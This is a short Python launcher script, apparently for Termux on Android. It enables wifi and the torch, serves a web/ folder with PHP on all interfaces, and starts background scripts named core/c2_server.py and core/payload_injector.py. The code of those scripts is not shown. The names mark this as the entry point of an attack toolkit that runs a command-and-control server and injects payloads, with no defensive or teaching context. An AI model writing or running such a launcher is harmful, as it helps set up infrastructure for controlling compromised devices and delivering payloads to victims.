import os  

os.system("termux-wifi-enable")  
os.system("termux-torch on")  
os.system("php -S 0.0.0.0:8080 -t web/ &")  
os.system("python core/c2_server.py &")  
os.system("python core/payload_injector.py &")  
